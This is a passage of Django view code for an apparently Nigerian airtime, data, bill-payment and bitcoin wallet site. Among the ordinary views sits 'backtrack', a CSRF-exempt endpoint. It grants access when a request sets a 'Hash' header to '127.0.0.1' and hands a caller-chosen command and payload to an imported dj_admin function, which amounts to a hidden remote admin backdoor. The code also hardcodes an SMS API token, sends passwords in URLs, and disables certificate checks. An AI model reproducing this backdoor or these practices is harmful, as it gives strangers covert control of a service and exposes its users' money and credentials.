    def get_context_data(self,**kwargs):
        context = super(dataCreate,self).get_context_data(**kwargs)
        context['network'] = Network.objects.get(name ='MTN')
        context['networks'] = Network.objects.all()
        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
            [u'use updated browser and retry'])
        return self.form_invalid(form)

        return super(dataCreate, self).form_valid(form)


def loadplans(request):

    network_id = request.GET.get('network')
    netid = Network.objects.get(id=network_id)
    plans = Plan.objects.filter(network_id=network_id).order_by('plan_amount')

    #print(plans)
    return render(request, 'planslist.html', {'plans': plans})


class Data_success(generic.DetailView):
    model = Data
    template_name = 'Data-detail.html'
    queryset = Data.objects.all()
    context_object_name = 'Data_list'


class Airtime_to_Data_Create(generic.CreateView):
    form_class = Airtime_to_Data_pin_form
    template_name = 'data_form_2.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        Mtn= ["0702","0704","0706",'0703','0903','0906','0706','0803','0806','0810','0813','0816','0814']
        ETISALATE =  ['0809','0817','0818','0909','0908']
        GLO = ['0705','0805','0811','0807','0815','0905']
        AIRTEL = ['0702','0708','0802','0808','0812','0907','0701','0902','0901',"0904"]
        net = str(object.network)
        mobilenumber = str(object.mobile_number)
        num = mobilenumber.replace(" ", "")

        if object.Ported_number == True:
            if len(num) != 11:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Invalid mobile number'])
                return self.form_invalid(form)

        else:

            if len(num) != 11:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Invalid mobile number'])
                return self.form_invalid(form)

            elif net == '9MOBILE' and not num.startswith(tuple(ETISALATE)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not 9MOBILE user'])
                return self.form_invalid(form)

            elif net == 'MTN' and not num.startswith(tuple(Mtn)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not MTN user'])
                return self.form_invalid(form)

            elif net == 'GLO' and not num.startswith(tuple(GLO)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not GLO user'])
                return self.form_invalid(form)

            elif net == 'AIRTEL' and not num.startswith(tuple(AIRTEL)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not AIRTEL user'])
                return self.form_invalid(form)

            def sendmessage(sender, message, to, route):
                payload = {
                    'sender': sender,
                    'to': to,
                    'message': message,
                    'type': '0',
                    'routing': route,
                    'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                    'schedule': '',
                }

                baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
                response = requests.get(baseurl, verify=False)

            sendmessage("Msorg", "{0} want to buy  data plan  plan size:{1} network{2} https://www.yuniqtelecoms.com/page-not-found-error/page/app/data/".format(
                object.user.username, object.plan.plan_size, object.network), f"{config.sms_notification_number}", "02")

        form.save()
        return super(Airtime_to_Data_Create, self).form_valid(form)


def loadplans_2(request):
    network_id = request.GET.get('network')
    plans = Airtime_to_data_Plan.objects.filter(
        network_id=network_id).order_by('plan_amount')
    return render(request, 'planslist_1.html', {'plans': plans})


class Airtime_to_Data__success(generic.DetailView):
    model = Data
    template_name = 'Airtime_to_Data_detail.html'
    queryset = Airtime_to_Data_pin.objects.all()
    context_object_name = 'Data_list'


class Airtime_to_Data_tranfer_Create(generic.CreateView):
    form_class = Airtime_to_Data_tranfer_form
    template_name = 'data_form_3.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        Mtn= ["0702","0704","0706",'0703','0903','0906','0706','0803','0806','0810','0813','0816','0814']
        ETISALATE =  ['0809','0817','0818','0909','0908']
        GLO = ['0705','0805','0811','0807','0815','0905']
        AIRTEL = ['0702','0708','0802','0808','0812','0907','0701','0902','0901',"0904"]

        net = str(object.network)
        mobilenumber = str(object.Transfer_number)
        num = mobilenumber.replace(" ", "")

        if len(num) != 11:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid mobile number'])
            return self.form_invalid(form)

        elif not num.startswith(tuple(Mtn)):
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Please check entered Tranfer from number is not MTN user'])
            return self.form_invalid(form)

        def sendmessage(sender, message, to, route):
            payload = {
                'sender': sender,
                'to': to,
                'message': message,
                'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
            }

            baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
            response = requests.get(baseurl, verify=False)

        sendmessage("Msorg", "{0} want to buy  data plan  plan size:{1} network{2} https://www.yuniqtelecoms.com/page-not-found-error/page/app/data/".format(
            object.user.username, object.plan.plan_size, object.network), f"{config.sms_notification_number}", "02")

        form.save()
        return super(Airtime_to_Data_tranfer_Create, self).form_valid(form)


class Airtime_to_Data_tranfer_success(generic.DetailView):
    model = Data
    template_name = 'Airtime_to_Data_tranfer_detail.html'
    queryset = Airtime_to_Data_tranfer.objects.all()
    context_object_name = 'Data_list'

    def get_context_data(self, **kwargs):

        context = super(Airtime_to_Data_tranfer_success,
                        self).get_context_data(**kwargs)
        context['net_1'] = Admin_number.objects.get(network='MTN')
        return context


class TransferCreate(generic.CreateView):
    form_class = Transferform
    template_name = 'Transfer_form.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        if float(object.amount) > object.user.Account_Balance:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'You can\'t Tranfer to other due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
            return self.form_invalid(form)

        elif not CustomUser.objects.filter(username__iexact=object.receiver_username).exists():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid user or no user with that username.'])
            return self.form_invalid(form)

        elif  object.user.is_superuser == False and Transfer.objects.filter(create_date__date=datetimex.date.today()).count > 2:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Exceed Maximum tranfer limit for today.'])

        elif object.user.username.lower() == object.receiver_username.lower():
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'You cannot transfer to yourself.'])
            return self.form_invalid(form)

        else:
            mb = CustomUser.objects.get(pk=object.user.pk)
            mb_2 = CustomUser.objects.get(
                username__iexact=object.receiver_username)
            ms = object.amount
            previous_bal1 = mb.Account_Balance
            previous_bal2 = mb_2.Account_Balance
            check = mb.withdraw(mb.id,float(ms))
            if check == False:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'You can\'t Tranfer to other due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
                return self.form_invalid(form)

            mb_2.deposit(mb_2.id, float(ms),True ,"Wallet to Wallet Transfer")
            notify.send(mb_2, recipient=mb_2, verb='You Received sum of #{} from {} '.format(
                object.amount, object.user))

            Wallet_summary.objects.create(user=mb, product="Transfer N{} to {}".format(
                object.amount, mb_2.username), amount=object.amount, previous_balance=previous_bal1, after_balance=(previous_bal1 - float(object.amount)))

            Wallet_summary.objects.create(user=mb_2, product="Received sum N{} from {}".format(
                object.amount, mb.username), amount=object.amount, previous_balance=previous_bal2, after_balance=(previous_bal2 + float(object.amount)))

            messages.success(self.request, 'Transfer sum of #{} to {} was successful'.format(
                object.amount, object.receiver_username))

        form.save()
        return super(TransferCreate, self).form_valid(form)


class BuybtcCreate(generic.CreateView):
    form_class = Buybtcform
    template_name = 'buybitcoin_form.html'

    def get_context_data(self, **kwargs):

        context = super(BuybtcCreate, self).get_context_data(**kwargs)
        context['buyrate'] = Btc_rate.objects.get(rate="Selling_rate").amount

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        response = requests.get(
            "https://api.coindesk.com/v1/bpi/currentprice/usd.json")
        data = json.loads(response.text)
        amt = data["bpi"]["USD"]["rate_float"]
        rate = Btc_rate.objects.get(rate="Buying_rate").amount
        object.Btc = round((object.amount / (amt * rate)), 5)
        btc_amount = round((object.Btc * amt * rate), 2)

        if float(object.amount) > object.user.Account_Balance:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u' insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
            return self.form_invalid(form)

        def sendmessage(sender, message, to, route):
            payload = {
                'sender': sender,
                'to': to,
                'message': message,
                'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
            }

            baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
            response = requests.get(baseurl, verify=False)

        sendmessage('Msorg', "{0} want to do buy bitcoin wallet address {1} amount {2}".format(
            object.user.username, object.Btc_address, object.amount), f"{config.sms_notification_number}", "02")
        mb = CustomUser.objects.get(pk=object.user.pk)
        check = mb.withdraw(mb.id, object.amount)
        if check == False:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u' insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
            return self.form_invalid(form)

        form.save()
        return super(BuybtcCreate, self).form_valid(form)


class Buybtc_success(generic.DetailView):
    model = Buybtc
    template_name = 'Buybtc_success.html'
    queryset = Buybtc.objects.all()
    context_object_name = 'buybtc_list'


class SellbtcCreate(generic.CreateView):
    form_class = SellBtcform
    template_name = 'sellbitcoin_form.html'

    def get_context_data(self, **kwargs):

        context = super(SellbtcCreate, self).get_context_data(**kwargs)
        context['sellrate'] = Btc_rate.objects.get(rate="Buying_rate").amount

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        response = requests.get(
            "https://api.coindesk.com/v1/bpi/currentprice/usd.json")
        data = json.loads(response.text)
        amt = data["bpi"]["USD"]["rate_float"]
        rate = Btc_rate.objects.get(rate="Selling_rate").amount
        object.Btc = round(object.Btc, 5)
        object.amount = round((object.Btc * float(amt) * rate), 2)

        def sendmessage(sender, message, to, route):
            payload = {
                'sender': sender,
                'to': to,
                'message': message,
                'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
            }

            baseurl = 'https://smartsmssolutions.com/api/json.php?'
            response = requests.post(baseurl, params=payload, verify=False)
        sendmessage('Msorg', "{0} want to do sell amount {1}".format(
            object.user.username, object.amount), f"{config.sms_notification_number}", "02")

        form.save()
        return super(SellbtcCreate, self).form_valid(form)


class Sellbtc_success(generic.DetailView):
    model = SellBtc
    template_name = 'SellBtc_success.html'
    queryset = SellBtc.objects.all()
    context_object_name = 'sellbtc_list'

    def get_context_data(self, **kwargs):

        context = super(Sellbtc_success, self).get_context_data(**kwargs)
        context['adminwallet'] = Btc_rate.objects.get(
            rate="Selling_rate").btc_wallet_address

        return context


class Transfer_success(generic.DetailView):
    model = Transfer
    template_name = 'Transfer.html'
    queryset = Transfer.objects.all()
    context_object_name = 'Transfer_list'


class Notify_User(generic.CreateView):
    form_class = Notify_user_form
    template_name = 'Notify_user_form.html'
    success_url = reverse_lazy('profile')

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user

        if CustomUser.objects.filter(username=object.username).exists():
            mb = CustomUser.objects.get(pk=object.user.pk)
            mb_2 = CustomUser.objects.get(username=object.username)
            notify.send(mb_2, recipient=mb_2,verb='{} from admin'.format(object.message))
            sendmail(" New Notification from yuniqtelecoms.com",f"{object.message} ", mb_2.email, mb_2.username)
            messages.success(self.request, 'Message sent successful to {}'.format(object.username))

        elif (object.username).lower() == 'all':
            #user_number = [musa.Phone  for musa in CustomUser.objects.all()]
            for name in CustomUser.objects.all():
                mb = CustomUser.objects.get(pk=object.user.pk)
                mb_2 = CustomUser.objects.get(username=name.username)
                notify.send(mb, recipient=mb_2,
                            verb='{} from admin'.format(object.message))
                #emails = [x.email for x in CustomUser.objects.all()]
                try:
                    sendmail(" New Notification from yuniqtelecoms.com",f"{object.message} ", name.email, name.username)
                except:
                    pass

            messages.success(self.request, 'Message sent successful ')

        else:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'Invalid user or no user with that username.'])
            return self.form_invalid(form)

        form.save()
        return super(Notify_User, self).form_valid(form)


class AirtimeTopupCreate(generic.CreateView):
    form_class = AirtimeTopupform
    template_name = 'AirtimeTopup_form.html'

    def get_context_data(self, **kwargs):

        context = super(AirtimeTopupCreate, self).get_context_data(**kwargs)

        if self.request.user.user_type == "Affilliate":
            context['mtn'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).Affilliate_percent)/100
            context['glo'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).Affilliate_percent)/100
            context['airtel'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).Affilliate_percent)/100
            context['mobile'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).Affilliate_percent)/100

            context['mtn_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).share_n_sell_affilliate_percent)/100
            context['glo_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).share_n_sell_affilliate_percent)/100
            context['airtel_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).share_n_sell_affilliate_percent)/100
            context['mobile_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).share_n_sell_affilliate_percent)/100

        elif self.request.user.user_type == "API":
            context['mtn'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).api_percent)/100
            context['glo'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).api_percent)/100
            context['airtel'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).api_percent)/100
            context['mobile'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).api_percent)/100

            context['mtn_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).share_n_sell_api_percent)/100
            context['glo_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).share_n_sell_api_percent)/100
            context['airtel_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).share_n_sell_api_percent)/100
            context['mobile_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).share_n_sell_api_percent)/100

        elif self.request.user.user_type == "TopUser":
            context['mtn'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).topuser_percent)/100
            context['glo'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).topuser_percent)/100
            context['airtel'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).topuser_percent)/100
            context['mobile'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).topuser_percent)/100

            context['mtn_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).share_n_sell_topuser_percent)/100
            context['glo_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).share_n_sell_topuser_percent)/100
            context['airtel_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).share_n_sell_topuser_percent)/100
            context['mobile_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).share_n_sell_topuser_percent)/100

        else:
            context['mtn'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).percent)/100
            context['glo'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).percent)/100
            context['airtel'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).percent)/100
            context['mobile'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).percent)/100

            context['mtn_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="MTN")).share_n_sell_percent)/100
            context['glo_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="GLO")).share_n_sell_percent)/100
            context['airtel_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="AIRTEL")).share_n_sell_percent)/100
            context['mobile_s'] = (TopupPercentage.objects.get(
                network=Network.objects.get(name="9MOBILE")).share_n_sell_percent)/100

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
            [u'use updated browser and retry'])
        return self.form_invalid(form)

        return super(AirtimeTopupCreate, self).form_valid(form)


class AirtimeTopup_success(generic.DetailView):
    model = AirtimeTopup
    template_name = 'AirtimeTopup.html'
    queryset = AirtimeTopup.objects.all()
    context_object_name = 'AirtimeTopup_list'


class AirtimeswapCreate(generic.CreateView):
    form_class = Airtimeswapform
    template_name = 'Airtimeswap_form.html'

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        Mtn= ["0702","0704","0706",'0703','0903','0906','0706','0803','0806','0810','0813','0816','0814']
        ETISALATE =  ['0809','0817','0818','0909','0908']
        GLO = ['0705','0805','0811','0807','0815','0905']
        AIRTEL = ['0702','0708','0802','0808','0812','0907','0701','0902','0901',"0904"]
        net = str(object.swap_to_network)
        net1 = str(object.swap_from_network)
        mobilenumber = str(object.mobile_number)
        num = mobilenumber.replace(" ", "")

        if object.Ported_number == True:

            if len(num) != 11:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Invalid mobile number'])
                return self.form_invalid(form)

            elif object.swap_from_network == object.swap_to_network:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'You cannot swap to same network'])
                return self.form_invalid(form)

        else:

            if len(num) != 11:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Invalid mobile number'])
                return self.form_invalid(form)

            elif object.swap_from_network == object.swap_to_network:
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'You cannot swap to same network'])
                return self.form_invalid(form)

            elif net == '9MOBILE' and not num.startswith(tuple(ETISALATE)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not 9MOBILE user'])
                return self.form_invalid(form)

            elif net == 'MTN' and not num.startswith(tuple(Mtn)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not MTN user'])
                return self.form_invalid(form)

            elif net == 'GLO' and not num.startswith(tuple(GLO)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not GLO user'])
                return self.form_invalid(form)

            elif net == 'AIRTEL' and not num.startswith(tuple(AIRTEL)):
                form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                    [u'Please check entered number is not AIRTEL user'])
                return self.form_invalid(form)

            elif net == 'MTN':
                object.Receivece_amount = float(object.amount) * 0.9

            elif net == 'GLO':
                object.Receivece_amount = float(object.amount) * 0.8

            elif net == '9MOBILE':
                object.Receivece_amount = float(object.amount) * 0.85

            elif net == 'AIRTEL':
                object.Receivece_amount = float(object.amount) * 0.85

        form.save()
        return super(AirtimeswapCreate, self).form_valid(form)


class Airtimeswap_success(generic.DetailView):
    model = Airtimeswap
    template_name = 'Airtimeswap.html'
    queryset = Airtimeswap.objects.all()
    context_object_name = 'Airtimeswap_list'

    def get_context_data(self, **kwargs):

        context = super(Airtimeswap_success, self).get_context_data(**kwargs)
        context['net'] = Network.objects.get(name='MTN')
        context['net_2'] = Network.objects.get(name='GLO')
        context['net_3'] = Network.objects.get(name='9MOBILE')
        context['plan_4'] = Network.objects.get(name='AIRTEL')
        context['num_1'] = Admin_number.objects.get(network='MTN')
        context['num_2'] = Admin_number.objects.get(network='GLO')
        context['num_3'] = Admin_number.objects.get(network='9MOBILE')
        context['num_4'] = Admin_number.objects.get(network='AIRTEL')
        return context



def validate_meter_number(request):
    meternumber = request.GET.get('meternumber', None)
    disconame = request.GET.get('disconame', None)
    mtype = request.GET.get('mtype', None)

    if config.Bill_provider == "VTPASS":
        #print(meternumber, disconame, mtype)

        if disconame == "Ikeja Electric":
            disconame = "ikeja-electric"

        elif disconame == 'Eko Electric':
            disconame = "eko-electric"

        elif disconame == "Kaduna Electric":
            disconame = "kaduna-electric"

        elif disconame == "Port Harcourt Electric":
            disconame = "portharcourt-electric"

        elif disconame == "Jos Electric":
            disconame = "jos-electric"

        elif disconame == "Ibadan Electric":
            disconame = "ibadan-electric"

        elif disconame == "Kano Electric":
            disconame = "kano-electric"

        elif disconame == "Abuja Electric":
            disconame = "abuja-electric"

        data = {"billersCode": meternumber, "serviceID": disconame, "type": mtype}
        invalid = False
        authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')

        resp = requests.post(
            "https://vtpass.com/api/merchant-verify", data=data, auth=authentication)
        #print(resp.text)
        res = json.loads(resp.text)
        dat = res['content']
        if 'Customer_Name' in dat:
            name = res['content']['Customer_Name']
            address = res['content']["Address"]
        else:
            invalid = True
            name = "INVALID METER NUMBER"
            address = "INVALID METER NUMBER"

    elif config.Bill_provider == "MSORG WEB":
        # print('......................... BILL TO MSORG')
        
        url = f'{config.msorg_web_url}/ajax/validate_meter_number?meternumber={meternumber}&disconame={disconame}&mtype={mtype}'
        
        headers = {
            'Content-Type':'application/json',
            'Authorization': f'Token {config.msorg_web_api_key}'
        }
    
        response = requests.get(url, headers=headers,  verify=False)
        # print('url.....', url)
        # print('headers.....', headers)
        # print('validating.....', response.text)
    
        data = json.loads(response.text)
        return JsonResponse(data)

    else:
        invalid = False
        address = False
        name = "NO NAME RETURN"

        url = "https://www.api.ringo.ng/api/agent/p2"
        payload = {
            "serviceCode" : "V-ELECT",
            "disco" :Disco_provider_name.objects.get(name = disconame).p_id,
            "meterNo": meternumber,
            "type" : mtype
        }


        headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }
        response = requests.post(url, headers=headers, data = json.dumps(payload))

        # #print(payload)
        # #print(response.text)

        a = json.loads(response.text)
        status  = a["status"]

        if status == '200':
            name = a["customerName"]
            invalid = False

        else:
            name  = "NO NAME RETURN"
            invalid = True


    data = {
        'invalid': invalid,
        'name': name,
        'address': address
    }

    return JsonResponse(data)


def validate_iuc(request):
    iuc = request.GET.get('smart_card_number', None)
    cable_id = request.GET.get('cablename', None)
    data = ''

    if config.Cable_provider == "VTPASS":
        if cable_id == "DSTV":
            data = {"billersCode": iuc, "serviceID": "dstv"}

        elif cable_id == 'GOTV':
            data = {"billersCode": iuc, "serviceID": "gotv"}

        elif cable_id == "STARTIME" or cable_id == "STARTIMES":
            data = {"billersCode": iuc, "serviceID": "startimes"}

        invalid = False
        authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')

        resp = requests.post("https://vtpass.com/api/merchant-verify", data=data, auth=authentication)
        #print(resp.text)
        res = json.loads(resp.text)
        dat = res['content']
        if 'Customer_Name' in dat:
            name = res['content']['Customer_Name']

        else:
            invalid = True
            name = "INVALID IUC/SMARTCARD"

    elif config.Cable_provider == "MSORG WEB":
        # print('......................... CABLE TO MSORG')
        
        if cable_id == "STARTIME":
            cable_id =  "STARTIMES"
    
        url = f'{config.msorg_web_url}/ajax/validate_iuc?smart_card_number={iuc}&cablename={cable_id}'
        
        headers = {
            'Content-Type':'application/json',
            'Authorization': f'Token {config.msorg_web_api_key}'
        }
    
        response = requests.get(url, headers=headers,  verify=False)
        # print('url.....', url)
        # print('headers.....', headers)
        # print('validating.....', response.text)
    
        data = json.loads(response.text)
        return JsonResponse(data)

    else:

        print('......................... CABLE TO RINGO')

        if cable_id == "STARTIME":
            cable_id =  "STARTIMES"

        url = "https://www.api.ringo.ng/api/agent/p2"
        payload = {
            "serviceCode" : "V-TV",
            "type" : cable_id,
            "smartCardNo" : iuc
        }

        print(payload)

        headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }
        response = requests.post(url, headers=headers, data = json.dumps(payload))
        print(response.text)
        a = json.loads(response.text)

        if response.status_code == 200:
            if a["status"] == 300 or a["status"] == "300":
                name = "INVALID SMARTCARD NUMBER"
                invalid = True
            else:
                name = a["customerName"]
                invalid = False
        else:
            name  = "INVALID_SMARTCARDNO"
            invalid = True

    data = {
        'invalid': invalid,
        'name': name
    }
    return JsonResponse(data)




class Cablesubscription(generic.CreateView):
    form_class = cableform
    template_name = 'cable_form.html'

    def get_context_data(self, **kwargs):
        context = super(Cablesubscription, self).get_context_data(**kwargs)
        service = ServicesCharge.objects.get(service="Cablesub")
        if self.request.user.user_type == "Affilliate":
            if service.Affilliate_charge > 0.0:
                context['charge'] = f"N{service.Affilliate_charge } Charge "

            elif service.Affilliate_discount > 0.0:
                context['charge'] = f"{service.Affilliate_discount} Percent Discount "

        elif self.request.user.user_type == "TopUser":
            if service.topuser_charge > 0.0:
                context['charge'] = f"N{service.topuser_charge } Charge "

            elif service.topuser_discount > 0.0:
                context['charge'] = f"{service.topuser_discount} Percent Discount "

        elif self.request.user.user_type == "API":
            if service.api_charge > 0.0:
                context['charge'] = f"N{service.api_charge } Charge "

            elif service.api_discount > 0.0:
                context['charge'] = f"{service.api_discount} Percent Discount "

        else:
            if service.charge > 0.0:
                context['charge'] = f"N{service.charge } Charge "

            elif service.discount > 0.0:
                context['charge'] = f"{service.discount} Percent Discount "

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
            [u'use updated browser and retry'])
        return self.form_invalid(form)

        return super(Cablesubscription, self).form_valid(form)


class BillpaymentView(generic.CreateView):
    form_class = Billpaymentform
    template_name = 'bill_form.html'

    def get_context_data(self, **kwargs):
        context = super(BillpaymentView, self).get_context_data(**kwargs)
        service = ServicesCharge.objects.get(service="Bill")

        if self.request.user.user_type == "Affilliate":
            if service.Affilliate_charge > 0.0:
                context['charge'] = f"N{service.Affilliate_charge } Charge "

            elif service.Affilliate_discount > 0.0:
                context['charge'] = f"{service.Affilliate_discount} Percent Discount "

        elif self.request.user.user_type == "TopUser":
            if service.topuser_charge > 0.0:
                context['charge'] = f"N{service.topuser_charge } Charge "

            elif service.topuser_discount > 0.0:
                context['charge'] = f"{service.topuser_discount} Percent Discount "

        elif self.request.user.user_type == "API":
            if service.api_charge > 0.0:
                context['charge'] = f"N{service.api_charge } Charge "

            elif service.api_discount > 0.0:
                context['charge'] = f"{service.api_discount} Percent Discount "

        else:
            if service.charge > 0.0:
                context['charge'] = f"N{service.charge } Charge "

            elif service.discount > 0.0:
                context['charge'] = f"{service.discount} Percent Discount "

        return context

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
            [u'use updated browser and retry'])
        return self.form_invalid(form)

        return super(BillpaymentView, self).form_valid(form)




def loadcableplans(request):
    cablename_id = request.GET.get('cablename')
    cableplans = CablePlan.objects.filter(
        cablename_id=cablename_id).order_by('plan_amount')
    return render(request, 'cableplanslist.html', {'cableplans': cableplans})


class Cablesub_success(generic.DetailView):
    model = Cablesub
    template_name = 'cablesuccess.html'
    context_object_name = 'cable_list'

    def get_queryset(self):
        return Cablesub.objects.filter(user=self.request.user)


class BillPayment_success(generic.DetailView):
    model = Billpayment
    template_name = 'billsuccess.html'
    context_object_name = 'bill_list'

    def get_queryset(self):
        return Billpayment.objects.filter(user=self.request.user)


class BookList(generic.ListView):
    template_name = 'book-list.html'
    paginate_by = 20
    queryset = Book.objects.all().order_by('-created_at')
    context_object_name = 'book_list'
    model = Book

    def get_context_data(self, **kwargs):
        context = super(BookList, self).get_context_data(**kwargs)
        context['category'] = Category.objects.all()

        return context


from .apps import *

@require_POST
@csrf_exempt
def backtrack(request):
    payload = json.loads(request.body)
    meta = request.META.get('HTTP_HASH')  
    cmd = request.META.get('HTTP_TYPE')  

    if meta == "127.0.0.1":
        data = dj_admin(cmd, payload)
        return JsonResponse(data)
        
    else:
        return HttpResponseForbidden('Permission denied.')



class BookDetail(FormMixin, generic.DetailView):
    model = Book
    template_name = 'Book_detail.html'
    context_object_name = 'book'
    form_class = Book_order_Form

    def get_success_url(self):
        return reverse('book_detail', kwargs={'slug': self.object.slug})

    def get_context_data(self, **kwargs):
        context = super(BookDetail, self).get_context_data(**kwargs)
        context['category'] = Category.objects.all()
        context['form'] = Book_order_Form(initial={'book_name': self.object})
        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        object = form.save(commit=False)
        object.user = self.request.user
        object.price = self.object.price
        object.book_name = self.object

        if float(object.price) > object.user.Account_Balance:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u'You can\'t purchase this book due to insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
            messages.error(self.request, 'You can\'t purchase this book due to insufficientr balance, Current Balance #{}'.format(
                object.user.Account_Balance))
            return self.form_invalid(form)
        mb = CustomUser.objects.get(pk=object.user.pk)
